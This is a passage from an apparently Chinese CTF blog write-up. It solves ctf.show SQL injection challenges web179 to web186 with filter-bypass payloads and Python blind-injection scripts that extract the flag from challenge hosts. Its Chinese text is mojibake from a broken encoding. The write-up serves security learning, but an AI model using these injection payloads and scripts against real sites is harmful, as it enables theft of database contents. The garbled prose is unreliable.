title="web179"></a>web179</h4><p>Êää<code>%09 %0a %0b %0d</code>ËøáÊª§‰∫ÜÔºåÂèØ‰ª•Áî®<code>%0c</code></p><p>Êää‰∏äÈù¢ÁöÑÈÇ£‰∏™ÂÖ®Êç¢Êàê<code>%0c</code></p><h4 id="web180-Èó≠ÂêàÁªïËøá-23"><a href="#web180-Èó≠ÂêàÁªïËøá-23" class="headerlink" title="web180(Èó≠ÂêàÁªïËøá%23)"></a>web180(Èó≠ÂêàÁªïËøá%23)</h4><p>ËøáÊª§‰∫ÜÁ©∫Ê†ºÂíå%23 ÔºåÁ©∫Ê†ºÂèØÁî®<code>%0c</code>Ôºå%23Áî®<code>or&#39;1&#39;=&#39;&#39;</code></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1&#39;%0cunion%0cselect%0c1,2,group_concat(password)%0cfrom%0cctfshow_user%0cwhere%0cusername&#x3D;&#39;flag&#39;or&#39;1&#39;&#x3D;&#39;</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1&#39;%0cor%0cusername%0clike%0c&#39;flag</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#39;or&#39;1&#39;&#x3D;&#39;1&#39;--%0c</code></pre><h4 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h4><p>Âêå‰∏ä</p><h4 id="web182-likeÊ®°Á≥äÂåπÈÖç"><a href="#web182-likeÊ®°Á≥äÂåπÈÖç" class="headerlink" title="web182(likeÊ®°Á≥äÂåπÈÖç)"></a>web182(likeÊ®°Á≥äÂåπÈÖç)</h4><p>Â¢ûÂä†‰∫ÜflagËøáÊª§„ÄÇlikeÂèØ‰ª•Ê®°Á≥äÂåπÈÖçÔºåÊàñËÄÖÂêå‰∏ä‰∏áËÉΩÂØÜÁ†Å</p><p><code>%0c</code>Âú®Êú¨È¢ò‰æùÊóßÂèØÁî®„ÄÇ</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1&#39;||(username)like&#39;%fla%</code></pre><p>likeÂèØ‰ª•Áî®‰∏§‰∏™ÈÄöÈÖçÁ¨¶Ôºà‰∏çÂå∫ÂàÜÂ§ßÂ∞èÂÜôÔºâÔºö</p><table><thead><tr><th>Â≠óÁ¨¶</th><th>ËØ¥Êòé</th></tr></thead><tbody><tr><td><code>%</code></td><td>ÂåπÈÖç‰ªª‰ΩïÊï∞ÁõÆÁöÑÂ≠óÁ¨¶ÔºåÁîöËá≥ÂåÖÊã¨Èõ∂Â≠óÁ¨¶</td></tr><tr><td><code>_</code></td><td>Âè™ËÉΩÂåπÈÖç‰∏ÄÁßçÂ≠óÁ¨¶</td></tr></tbody></table><h4 id="web183-Â∏ÉÂ∞îÁõ≤Ê≥®"><a href="#web183-Â∏ÉÂ∞îÁõ≤Ê≥®" class="headerlink" title="web183(Â∏ÉÂ∞îÁõ≤Ê≥®)"></a>web183(Â∏ÉÂ∞îÁõ≤Ê≥®)</h4><p>Êü•ËØ¢ËØ≠Âè•</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//ÊãºÊé•sqlËØ≠Âè•Êü•ÊâæÊåáÂÆöIDÁî®Êà∑</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select count(pass) from "</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tableName'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">;</span>      </code></pre><p>ËøîÂõûÈÄªËæë</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//ÂØπ‰º†ÂÖ•ÁöÑÂèÇÊï∞ËøõË°å‰∫ÜËøáÊª§</span>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>      </code></pre><p>Êü•ËØ¢ÁªìÊûú</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//ËøîÂõûÁî®Êà∑Ë°®ÁöÑËÆ∞ÂΩïÊÄªÊï∞</span>      <span class="token variable">$user_count</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      </code></pre><p>wafÂèàÂ¢ûÂä†‰∫Ü‰∏Ä‰∫õÔºåÈ¢òÁõÆ‰πüÊúâÂèòÂåñ‰∫Ü„ÄÇÊü•ËØ¢Âà∞ÁöÑÁªìÊûú‰ºöËøîÂõûÂà∞‰∏ãÈù¢Á¨¨‰∏â‰∏™ÁÅ∞ÂùóÈÇ£Èáå„ÄÇ</p><p>select‰∏çËÉΩÁî®ÔºåÂ∞±Âè™ËÉΩÈÄâÊã©Â∏ÉÂ∞îÁõ≤Ê≥®ÊàñËÄÖÊó∂Èó¥Áõ≤Ê≥®‰∫Ü„ÄÇ</p><p>ËøôÈ¢òÁöÑËß£Ê≥ïÊòØÂú®Â∑≤Áü•Ë°®ÂêçÁöÑÊÉÖÂÜµ‰∏ãÂÆûÁé∞ÁöÑÔºåÂÜçÁªìÂêàÊ®°Á≥äÂåπÈÖçlikeÊàñËÄÖÊ≠£ÂàôÂåπÈÖçregexp„ÄÇ<br>ÂÜôËÑöÊú¨ÂâçÂÖàÊµãËØï‰∏Ä‰∏ãËØ≠Âè•ÊòØÂê¶ËÉΩÊ≠£Â∏∏ÊâßË°åÔºåÂèØ‰ª•ÁöÑËØùÔºåÂÜçÂÜôÂà∞ËÑöÊú¨Èáå„ÄÇ</p><p>Âõ†‰∏∫ÊØèÊ¨°Êü•ËØ¢ËÆ∞ÂΩïÊÄªÊï∞ÈÉΩÊòØ1Êù°ÔºåÂ∞±ÊòØÊàë‰ª¨Ë¶ÅÊâæÁöÑflagÔºåÊâÄ‰ª•È°µÈù¢Âõ∫ÂÆö‰ºöÂá∫Áé∞$user_count &#x3D; 1;ÔºåÂèØ‰ª•Áî®Â∏ÉÂ∞îÁõ≤Ê≥®„ÄÇ</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">tableName&#x3D;&#96;ctfshow_user&#96;where&#96;pass&#96;like&#39;ctfshow&#123;%&#39;</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">tableName&#x3D;&#96;ctfshow_user&#96;where(substr(&#96;pass&#96;,1,1)regexp(&#39;a&#39;))</code></pre><p>PayloadÔºö</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">tableName&#x3D;&#96;ctfshow_user&#96;where&#96;pass&#96;like&#39;ctfshow&#123;%&#39;</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">'https://b2eacc14-603c-45c4-bc2a-0ce02478cc81.challenge.ctf.show/select-waf.php'</span>flag <span class="token operator">=</span> <span class="token string">''</span>flagstr <span class="token operator">=</span> <span class="token string">"ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># (1, 46)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"tableName"</span><span class="token punctuation">:</span> <span class="token string">"`ctfshow_user`where`pass`like\'ctfshow&#123;&#125;%\'"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag <span class="token operator">+</span> j<span class="token punctuation">)</span>            <span class="token comment"># 'tableName': f'`ctfshow_user`where(substr(`pass`,&#123;i&#125;,1)regexp('&#123;j&#125;'))'</span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token comment"># ÊúâÂπ∂ÂèëÊï∞ÈáèÈôêÂà∂ÁöÑÈ¢òÁõÆÔºåÂ∞±Áù°‰∏ÄÊÆµÊó∂Èó¥</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 1;"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ctfshow"</span> <span class="token operator">+</span> flag<span class="token punctuation">)</span></code></pre><h4 id="web184-right-join-having"><a href="#web184-right-join-having" class="headerlink" title="web184(right join   having)"></a>web184(right join   having)</h4><p>ËøîÂõûÈÄªËæë</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//ÂØπ‰º†ÂÖ•ÁöÑÂèÇÊï∞ËøõË°å‰∫ÜËøáÊª§</span>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><p><code>where</code>„ÄÅ<code>&#39; &quot;</code>„ÄÅÂèçÂºïÂè∑Ë¢´ËøáÊª§‰∫ÜÔºå‰ΩÜÊòØÊú¨È¢òÊ≤°ÊúâËøáÊª§Á©∫Ê†º„ÄÇ</p><p><strong>ÊñπÊ≥ï‰∏ÄÔºöÔºàÁî®right joinÁªïËøáËøáÊª§Ôºâ</strong></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">tableName&#x3D;&#96;ctfshow_user&#96; as a right join ctfshow_user as b on substr(b.pass,1,1)regexp(char(46))</code></pre><p>RIGHT JOIN ÂÖ≥ÈîÆÂ≠ó‰ªéÂè≥Ë°®Ôºàtable2ÔºâËøîÂõûÊâÄÊúâÁöÑË°åÔºåÂç≥‰ΩøÂ∑¶Ë°®Ôºàtable1Ôºâ‰∏≠Ê≤°ÊúâÂåπÈÖç„ÄÇÂ¶ÇÊûúÂ∑¶Ë°®‰∏≠Ê≤°ÊúâÂåπÈÖçÔºåÂàôÁªìÊûú‰∏∫ NULL„ÄÇ</p><p>[right joinËèúÈ∏üÊïôÁ®ã](<a href="https://www.runoob.com/sql/sql-join-right.html">SQL RIGHT JOIN ÂÖ≥ÈîÆÂ≠ó | ËèúÈ∏üÊïôÁ®ã (runoob.com)</a>)</p><p>ËøôÈáåÊòØÂàÜÂà´Â∞Üctfshow_uerÈáçÂëΩÂêç‰∏∫aÂíåbÔºåÊé•ÁùÄÂú®b‰∏≠ËøõË°åÁ≠õÈÄâÔºåÁÑ∂ÂêéÁî®<code>right join</code>Â∞Üb‰∏≠Á≠õÈÄâÂá∫Êù•ÁöÑÂÄº‰∏éaË°®ÁöÑÂÄºËøõË°åÂåπÈÖç„ÄÇ</p><p>ËøôÈáåÁî®<code>$user_count = 43;</code>‰Ωú‰∏∫Á≠õÈÄâÊù°‰ª∂„ÄÇ</p><p>Y4tackerÂ∏àÂÇÖÁöÑ‰ª£Á†Å</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># @Author:Y4tacker</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://214a3dd9-ba25-480b-bdc0-0f33a1c754d8.challenge.ctf.show/select-waf.php"</span>flag <span class="token operator">=</span> <span class="token string">'ctfshow&#123;'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">&lt;=</span> <span class="token number">8</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"tableName"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)regexp(char(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">)))"</span></span>        <span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 43;"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">"."</span><span class="token punctuation">:</span>                flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"&#125;"</span><span class="token punctuation">:</span>                    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                <span class="token keyword">break</span></code></pre><p><strong>ÊñπÊ≥ï‰∫åÔºöÔºàwhereÁî®having‰ª£ÊõøÔºå‚Äô ‚ÄúÂèØ‰ª•Áî® ()+Hex‰ª£ÊõøÔºâ</strong></p><p>Êü•ÁúãÂÆòÊñπÊñáÊ°£ÔºåÁúãÁúãselectËØ≠Ê≥ï„ÄÇÂèëÁé∞havingÂíåwhereÂèØ‰ª•ÊõøÊç¢Ôºå‰ΩÜÊòØhavingËØ≠Âè•Êúâ‰ΩøÁî®Êù°‰ª∂„ÄÇ</p><blockquote><p>‰∏Ä‰∏™HAVINGÂ≠êÂè•ÂøÖÈ°ª‰Ωç‰∫éGROUP BYÂ≠êÂè•‰πãÂêéÔºåÂπ∂‰Ωç‰∫éORDER BYÂ≠êÂè•‰πãÂâç„ÄÇ</p></blockquote><p><a href="https://www.runoob.com/sql/sql-having.html">SQL HAVING Â≠êÂè•</a></p><p><img src="web184.png" loading="lazy"></p><p><strong>ÂçÅÂÖ≠ËøõÂà∂</strong>ÔºöÂèØ‰ª•ÂâçÈù¢Âä†xÔºåÂêéÈù¢Áî®ÂºïÂè∑ÂåÖË£πÊàñËÄÖ0xÔºõ‰πüÂèØ‰ª•ÂíåÁÆóÊï∞ËøêÁÆóÁªìÂêàË°®Á§∫Êï∞Â≠ó„ÄÇ</p><p><img src="web184_2.png" loading="lazy"></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">tableName&#x3D;ctfshow_user group by pass having pass like 0x63746673686f777b25  #ctfshow&#123;%</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl<span class="token operator">=</span><span class="token string">"http://24873af7-39c6-4235-85e2-f6433b80f182.challenge.ctf.show/select-waf.php"</span>flagstr<span class="token operator">=</span><span class="token string">"ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_"</span>   <span class="token comment">#40</span>flag<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        data<span class="token operator">=</span><span class="token punctuation">&#123;</span>            <span class="token string">"tableName"</span><span class="token punctuation">:</span><span class="token string">"ctfshow_user group by pass having pass like 0x63746673686f777b&#123;&#125;25"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token operator">+</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">#print(data)</span>        response<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token comment">#ÊúâÂπ∂ÂèëÊï∞ÈáèÈôêÂà∂ÁöÑÔºåÂ∞±Áù°‰∏ÄÊÆµÊó∂Èó¥</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 1;"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>            flag<span class="token operator">+=</span>x            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ctfshow&#123;"</span><span class="token operator">+</span>flag<span class="token punctuation">)</span></code></pre><h4 id="web185-trueÁªïËøáÊï∞Â≠ó"><a href="#web185-trueÁªïËøáÊï∞Â≠ó" class="headerlink" title="web185(trueÁªïËøáÊï∞Â≠ó)"></a>web185(trueÁªïËøáÊï∞Â≠ó)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//ÂØπ‰º†ÂÖ•ÁöÑÂèÇÊï∞ËøõË°å‰∫ÜËøáÊª§</span>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><p>Êï∞Â≠óË¢´ban‰∫Ü</p><p><img src="web185.png" loading="lazy"></p><p><strong>ÊñπÊ≥ï‰∏Ä</strong>ÔºöÂèØ‰ª•‰ΩøÁî®concatÊù•ÊãºÊé•Â≠óÁ¨¶‰∏≤</p><p><img src="web185_2.png" loading="lazy"></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> string<span class="token keyword">def</span> <span class="token function">formatString</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    temp <span class="token operator">=</span> <span class="token string">"concat("</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        tip <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">if</span> x <span class="token keyword">in</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">:</span>            tmp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tip <span class="token operator">=</span> <span class="token number">1</span>            temp <span class="token operator">+=</span> <span class="token string">"char("</span>            tmp <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>        <span class="token keyword">if</span> tmp <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            temp <span class="token operator">+=</span> <span class="token string">"false"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            temp_d <span class="token operator">=</span> <span class="token string">"("</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">:</span>                temp_d <span class="token operator">+=</span> <span class="token string">"true+"</span>            temp_d <span class="token operator">=</span> temp_d<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">")"</span>            <span class="token keyword">if</span> tip <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                temp_d <span class="token operator">+=</span> <span class="token string">")"</span>            temp <span class="token operator">+=</span> temp_d        temp <span class="token operator">+=</span> <span class="token string">","</span>    temp <span class="token operator">=</span> temp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">")"</span>    <span class="token keyword">return</span> temp<span class="token comment"># print(formatString("0x63746673686f777b"))</span>url <span class="token operator">=</span> <span class="token string">"https://8ea77825-d310-4375-b330-8826bf8db1a3.challenge.ctf.show/select-waf.php"</span><span class="token comment"># dicÁöÑÈ°∫Â∫èÂèØ‰ª•Êîπ‰∏Ä‰∏ãÔºÅÊàëÊòØÊáíÂæóÊîπ‰∫ÜÔºÅÊîπÈ°∫Â∫èÂèØ‰ª•ÊèêÈ´òÊïàÁéáÔºÅÔºÅÔºÅ</span>dic <span class="token operator">=</span> <span class="token string">"ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_"</span>flag <span class="token operator">=</span> <span class="token string">"ctfshow&#123;"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> dic<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"tableName"</span><span class="token punctuation">:</span> <span class="token string">"ctfshow_user group by pass having pass regexp(&#123;&#125;)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>formatString<span class="token punctuation">(</span>flag <span class="token operator">+</span> x<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>        <span class="token comment"># print(data)</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 1;"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>            flag <span class="token operator">+=</span> x            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token comment"># print("[--] &#123;&#125; is wrong".format(x))</span>            <span class="token keyword">continue</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[flag]:"</span> <span class="token operator">+</span> flag<span class="token punctuation">)</span></code></pre><p><strong>ÊñπÊ≥ï‰∫å</strong>ÔºöÁªßÁª≠‰ΩøÁî®right join</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">creatNum</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> <span class="token string">"true"</span>    <span class="token keyword">if</span> num <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> res    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            res <span class="token operator">+=</span> <span class="token string">"+true"</span>    <span class="token keyword">return</span> resurl <span class="token operator">=</span> <span class="token string">'https://16d50b32-c89c-423e-aa09-841d997cb617.challenge.ctf.show/select-waf.php'</span>flag <span class="token operator">=</span> <span class="token string">"ctfshow&#123;"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"tableName"</span><span class="token punctuation">:</span> <span class="token string">"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,&#123;&#125;,true)regexp(char(&#123;&#125;)))"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>                creatNum<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> creatNum<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 43;"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token keyword">and</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">'.'</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="web186"><a href="#web186" class="headerlink" title="web186"></a>web186</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&lt;|\>|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token 